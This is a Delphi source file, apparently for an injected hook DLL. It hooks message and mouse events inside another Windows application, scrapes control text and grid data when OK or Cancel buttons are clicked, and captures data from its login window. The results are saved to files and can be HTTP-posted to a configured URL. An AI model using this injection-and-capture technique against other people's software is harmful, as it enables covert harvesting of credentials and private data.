unit Logic;

interface
uses
Windows,
Messages,
Dialogs,
Grids,
cxGrid,
//cxExportGrid4Link,
Controls,
cxButtons,
StdCtrls,
TlHelp32,
SysUtils,
cxGridLevel,
cxGridDBTableView,
cxGridTableView,
cxGridCustomView,
cxCustomData,
Utils,
DataManager,
uLkJSON,
DataTrans;

procedure Init();
procedure DoProc(nCode,wParam,lParam: DWORD);
procedure DoProcMouse(nCode: Integer; wParam:Integer; lParam: LongInt);
procedure GetData(hOp: HWND);
procedure PostData();
procedure GetGridData(grid: TStringGrid);
procedure GetTcxGridData(grid: TcxGrid);
implementation

var
  roopCount: Integer;
  strTab: string;
  curProcessID,injectProcessID: Cardinal;

procedure DoWindows(h: HWND);
var
  buf: array[0..255] of Char; {这个缓冲区是获取类名用的, 如果不需要可以删除}
  s: AnsiString;
  s1: AnsiString;
  nRet: Integer;
  nRet1: Integer;
  count: Integer;
  Grid, Grid1: TStringGrid;
  tGrid: TcxGrid;
  cxBtn: TcxButton;
  i: Integer;
  tcl: TWinControl;
begin
   GetClassName(h, buf, Length(buf));
//  MessageBox(0, buf, 'Init', MB_OK);
  tcl := Utils.GetInstanceFromhWnd(h);
//  tcl := Utils.FindControl(h);
  if tcl=nil then
  MessageBox(0, 'FindControl nil', buf, MB_OK);
//  nRet := Pos('TcxGrid', buf);
////  nRet := Pos('TStringGrid', buf);
  nRet1 := Pos('TcxGridSite', buf);
  nRet := Pos('TcxButton', buf);
  if (nRet<>0) and (nRet1=0) then
    begin
//    tGrid := TcxGrid(Utils.GetInstanceFromhWnd(h));
////     tGrid := TcxGrid(Pointer($1FD3164));
//    ShowMessageFmt('%s:%d', [buf, h]);
//    if(tGrid<>nil)  then
//      begin
//        s1 := Format('tcxgrid  find: %x view count = %d ', [Integer(@tGrid), tGrid.Levels.Count]);
//        MessageBox(0, PAnsiChar(AnsiString(s1)), 'tcxgrid', MB_OK);
//        GetTcxGridData(tGrid);
//      end

////    Grid := TStringGrid(Utils.GetInstanceFromhWnd(h));
//    Grid := TStringGrid(FindControl(h));
//    Grid1 := TStringGrid(Utils.GetInstanceFromhWnd(h));
//    if(Grid<>nil)  then
//      begin
//        s1 := Format('TStringGrid  find: %x , %x', [Integer(@Grid), Integer(@Grid1)]);
//        MessageBox(0, PAnsiChar(AnsiString(s1)), 'TStringGrid', MB_OK);
//        GetGridData(Grid);
//      end

// TcxButton
//    cxBtn := TcxButton(Utils.GetInstanceFromhWnd(h));
//    if(cxBtn<>nil)  then
//      begin
//       i := cxBtn.GetTextLen();
//       cxBtn.GetTextBuf(buf, 255);
//       MessageBox(0, buf,'Button', MB_OK);
//       ShowMessageFmt('%s---%d', ['TcxButton Text len=', i]);
//      end
  end;
end;


procedure DoWindowsEx(h: HWND);
var
  buf: array[0..255] of Char; {这个缓冲区是获取类名用的, 如果不需要可以删除}
  nRet, nRet1, tab: Integer;
  tcl: TWinControl;
  s, s1: string;
begin
 // ShowMessageFmt('GetClassName-----%s', [buf]);
  if Utils.FilterControls(h) then
  begin
    tcl := Utils.GetInstanceFromhWnd(h);
    if tcl<>nil then
      begin
        if tcl.Visible then
        begin
          tab := tcl.TabOrder;
          tcl.GetTextBuf(buf, 255);
          //ShowMessageFmt('%s----%d ', [buf, tab]);
          s1 := Format('%s----%d ', [buf, tab]);
          s := Concat(s, Char(13), Char(10));
          strTab := Concat(strTab, s);
          strTab := Concat(strTab, s1);
        end;
      end;
  end;
end;

procedure GetChildWindows(h: HWND);
  begin
//DoWindows(h);
  DoWindowsEx(h);
  h := GetWindow(h, GW_CHILD); {第一个子窗口}
  while h <> 0 do
  begin
    GetChildWindows(h); {递归}
    h := GetWindow(h, GW_HWNDNEXT); {下一个子窗口}
  end;
  end;


procedure GetGridData(grid: TStringGrid);
var
   c,r: Integer;
   s, s1: string;
begin
  for r := 0 to grid.RowCount - 1 do
  begin
      if r<>0 then s := Concat(s, Char(13), Chr(10));
  for c := 0 to grid.ColCount - 1 do
    begin
       s1 := Format('%s, ', [grid.Cells[c,r]]);
       s := Concat(s, s1);
       if c=grid.ColCount - 1 then
       begin
        if r=grid.RowCount - 1 then
        begin
           MessageBox(0, PAnsiChar(AnsiString(s)), 'data', MB_OK);
           SaveData(ExtractFilePath(ParamStr(0))+Utils.cntSaveAllDataName,
           s, True);
        end;
       end;
    end;
  end;

end;

procedure GetTcxGridData(grid: TcxGrid);
var
  FileName: string;
  cxGridDBTableView: TcxGridDBTableView;
  cxView, cxView1: TcxCustomGridView;
  i,j, nRowCount,nColCount: Integer;
  rowInfo: TcxRowInfo;
  s, s1: string;
  p: Pointer ;
  sStr: ShortString;

begin
    if grid.ActiveLevel = nil then
      ShowMessageFmt('%s',['ActiveLevel is nil'])
    else
    begin
       cxView := grid.FocusedView;
   
       if cxView=cxView1 then
        ShowMessageFmt('%s',['ActiveLevelGridView is FocusedView']);


       if cxView=nil then
         ShowMessageFmt('%s',['cxGridView is nil']);

       if cxView <> nil then
       begin
         if cxView.DataController=nil then
            ShowMessageFmt('%s',['DataController is nil'])
         else
         begin
           ShowMessageFmt('%s',['DataController is not nil']);
           nRowCount := cxView.DataController.GetRowCount();
           ShowMessageFmt('%s%d',['GetRecordCount:', nRowCount]);
           nColCount := cxView.DataController.GetItemCount();
           ShowMessageFmt('%s%d',['GetItemCount:', nColCount]);
           for i := 0 to nRowCount-1 do
           begin
           if i<>0 then s := Concat(s, Char(13), Chr(10));
            for j:=0 to 3 do
             begin
               s1 := Format('%s    ', [cxView.DataController.Values[i,j]]);
               ShowMessageFmt('%s%d%s%d%s',['Row:', i, 'Col:', j, s1]);
               s := Concat(s, s1);
             end;
           end;
         end;
            SaveData(ExtractFilePath(ParamStr(0))+Utils.cntSaveGridDataName,
            s, True);
//       p := cxView.ClassInfo();
//       sStr := cxView.ClassName();
//        if cxView is TcxGridTableView then
//          ShowMessageFmt('%s',['cxGridView is TcxGridTableView']);
//
//        if cxView is TcxGridDBTableView then
//          ShowMessageFmt('%s',['cxGridView is TcxGridDBTableView']);
//
//       grid.FocusedView :=  TcxGridTableView(grid.FocusedView);
//
//        if grid.FocusedView is TcxGridTableView then
//          ShowMessageFmt('%s',['FocusedView is TcxGridTableView']);
//          
////       FileName := ExtractFilePath(ParamStr(0))+Utils.cntSaveGridDataName;
////       cxExportGrid4Link.ExportGrid4ToText(FileName, grid, True, True);
       end;
    end;





//   FileName := ExtractFilePath(ParamStr(0))+Utils.cntSaveGridDataName;
//   ExportGridToText(FileName, grid, True, True);
end;


procedure TestJson();
var
  jsBase, js:TlkJSONobject;
  xs:TlkJSONbase;
  i,j,k,l: Integer;
  ws, FileName: String;
begin
  FileName:=ExtractFilePath(ParamStr(0))+Utils.cntSaveWeiXiuForShowName;
  xs := TlkJSONstreamed.LoadFromFile(FileName);
  ws := TlkJSON.GenerateText(xs);
  DataTrans.HttpPost(Utils.cntUrl, ws);
end;

procedure GetLoginData();
var
  h:HWND;
begin
  h := FindWindow(nil,PAnsiChar(Utils.cntLoginWind));
  DataManager.GetLoginData(h);
end;

procedure Init();
var
  h: HWND;
  i: Integer;
begin
  curProcessID:=GetCurrentProcessId();
  injectProcessID:=Utils.GetProcessIDByName(Utils.cntInjectExe);
  DataManager.Init();
//  GetLoginData();
//  TestJson();

//h := FindWindow(nil,PAnsiChar(Utils.cntInjetWind));
//DataManager.GetWindowsData(h);

// 抓数据
//  h := FindWindow(nil,PAnsiChar(Utils.cntInjetWind));
//  GetChildWindows(h);
//
//  if curProcessID=injectProcessID then
//  begin
//    ShowMessageFmt('%s', [strTab]);
//    Utils.SaveData(ExtractFilePath(ParamStr(0))+Utils.cntCatchSaveAllDataName,
//              strTab, False);
//  end;



end;

procedure DoProcMouse(nCode: Integer;wParam:WPARAM; lParam: LPARAM);
var
  p: PMouseHookStruct;
  bRet, bRet1: Boolean;
begin
   if curProcessID=injectProcessID  then
   begin
      p := PMouseHookStruct(lParam);
      DebugOut(Format('code=%x, wParam=%x, lParam(hWnd=%x, x=%d, y=%d)', [nCode, wParam, p.hwnd, p.pt.X, p.pt.Y]));
      //ShowMessageFmt('%s', ['---------DoProcMouse']);
      if wParam=WM_LBUTTONUP then
      begin
        bRet:=ClassNameContains(p.hwnd, 'TcxButton');
       bRet1:=ControlTextContains(p.hwnd, '取消');
       if bRet and bRet1 then
       begin
        GetData(p.hwnd);
       // PostData();
       end;

       bRet1:=ControlTextContains(p.hwnd, '确定');
       if bRet and bRet1 then
       begin
         //ShowMessageFmt('%s', ['---------WM_LBUTTONUP']);
         GetLoginData();
       end;
      end;
   end;

end;

procedure DoProc(nCode,wParam,lParam: DWORD);
var
  bRet, bRet1: Boolean;
  pcwp:PCWPStruct;
  st: MOUSEHOOKSTRUCT;
begin
  if curProcessID=injectProcessID  then
  begin
     if (nCode = HC_ACTION) then
    begin
      pcwp := PCWPStruct(lParam);
//      if (pcwp.message<>132) then
//      begin
////        Utils.LogOut(Format('hWnd=%x, wParam=%x, lParam(Msg=%x, Wparam=%x, Lparam=%x)',
////        [pcwp.hwnd,  wParam, pcwp.message, pcwp.wParam, pcwp.lParam]));
////        Utils.DebugOut(Format('hWnd=%x, wParam=%x, lParam(Msg=%x, Wparam=%x, Lparam=%x)',
////        [pcwp.hwnd,  wParam, pcwp.message, pcwp.wParam, pcwp.lParam]));
//      end;
      if (pcwp.message=$287) and (pcwp.wParam=$17) then
      begin
//        Utils.LogOut(Format('hWnd=%x, wParam=%x, lParam(Msg=%x, Wparam=%x, Lparam=%x)',
//        [pcwp.hwnd,  wParam, pcwp.message, pcwp.wParam, pcwp.lParam]));
//        ShowMessageFmt('hWnd=%x, wParam=%x, lParam(Msg=%x, Wparam=%x, Lparam=%x)',
//        [pcwp.hwnd,  wParam, pcwp.message, pcwp.wParam, pcwp.lParam]);
//        ShowMessageFmt('%s---%d', ['WM_COMMAND', HWND(pcwp.lParam)]);
//       DebugOut(Format('%s---%d', ['WM_COMMAND', HWND(pcwp.lParam)]));
         Utils.DebugOut(Format('hWnd=%x, wParam=%x, lParam(Msg=%x, Wparam=%x, Lparam=%x)',
        [pcwp.hwnd,  wParam, pcwp.message, pcwp.wParam, pcwp.lParam]));
         bRet:=ClassNameContains(HWND(pcwp.lParam), 'TcxButton');
         bRet1:=ControlTextContains(HWND(pcwp.lParam), '取消');
         if bRet and bRet1 then
         begin
          GetData(HWND(pcwp.lParam));                                         
         // PostData();
         end;

         bRet1:=ControlTextContains(HWND(pcwp.lParam), '确定');
         if bRet and bRet1 then
         begin
         GetLoginData();
         end;
      end;
    end;

  end;
end;

procedure GetData(hOp: HWND);
var
  h:HWND;
begin
  h := FindWindow(nil,PAnsiChar(Utils.cntInjetWind));
  DataManager.UpdateCurInfoType(h, hOp);
  DataManager.CleanData();
//ShowMessageFmt('%s:%d', ['window:', h]);
//GetChildWindows(h);
  DataManager.GetWindowsData(h);

// 搜索所有TAB值
//  SaveData(ExtractFilePath(ParamStr(0))+Utils.cntSaveGridDataName,
//            strTab, True);
end;

procedure PostData();
begin
  DataManager.PostData();
end;

end.
